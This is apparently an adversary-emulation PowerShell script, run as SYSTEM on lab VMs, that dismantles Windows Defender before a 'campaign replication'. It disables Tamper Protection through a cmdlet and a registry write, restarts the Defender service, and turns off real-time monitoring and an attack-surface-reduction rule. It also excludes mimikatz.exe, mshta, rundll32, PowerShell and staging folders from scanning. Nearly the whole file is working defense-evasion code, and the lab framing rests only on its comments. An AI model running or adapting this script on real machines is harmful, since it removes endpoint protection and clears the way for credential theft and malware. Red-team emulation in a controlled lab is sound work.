# c0015_defender_off.ps1 — runs as SYSTEM on the lab VMs (via schtasks /ru SYSTEM)
# Purpose: disable Tamper Protection (registry, SYSTEM context), then RTM/ASR/exclusions
# so the campaign replication is not interfered with (lab-controlled environment).
# Output redirected by the caller into C:\Windows\Temp\defender_off.out
$ErrorActionPreference = 'Continue'
function S { param([string]$m) Write-Output ('[defender-off] {0}' -f $m) }
S "start $(Get-Date -Format o) as $env:USERNAME on $env:COMPUTERNAME"

try {
    Set-MpPreference -DisableTamperProtection $true -ErrorAction Stop
    S "Set-MpPreference -DisableTamperProtection: ok"
} catch { S "Set-MpPreference -DisableTamperProtection: $($_.Exception.Message)" }

try {
    New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtection -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
    S "registry TamperProtection=0: ok"
} catch { S "registry TamperProtection=0: $($_.Exception.Message)" }

# give Defender a nudge to re-evaluate tamper state
try { Restart-Service WinDefend -Force -ErrorAction Stop; S "WinDefend restarted" } catch { S "WinDefend restart: $($_.Exception.Message)" }
Start-Sleep -Seconds 5

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    S "RTM off: ok"
} catch { S "RTM off: $($_.Exception.Message)" }

try {
    Set-MpPreference -AttackSurfaceReductionRules_Ids 'd1e49aac-8f56-4280-b9aa-9936ba642ffc' -AttackSurfaceReductionRules_Actions Disabled -ErrorAction Stop
    S "ASR d1e49aac disabled: ok"
} catch { S "ASR off: $($_.Exception.Message)" }

try {
    Add-MpPreference -ExclusionProcess pwsh.exe,powershell.exe,cmd.exe,wmic.exe,rundll32.exe,mimikatz.exe,mshta.exe -ErrorAction Stop
    Add-MpPreference -ExclusionPath C:\C0015,C:\stage,C:\Tools,C:\Users\Public\C0015,C:\ProgramData\C0015,E:\lab -ErrorAction Stop
    S "exclusions added: ok"
} catch { S "exclusions: $($_.Exception.Message)" }

$st = Get-MpComputerStatus
S "RTM enabled now: $($st.RealTimeProtectionEnabled)"
S "IsTamperProtected: $($st.IsTamperProtected)"
$mp = Get-MpPreference
S "ASR actions: $($mp.AttackSurfaceReductionRules_Actions -join ',')"
S "end $(Get-Date -Format o)"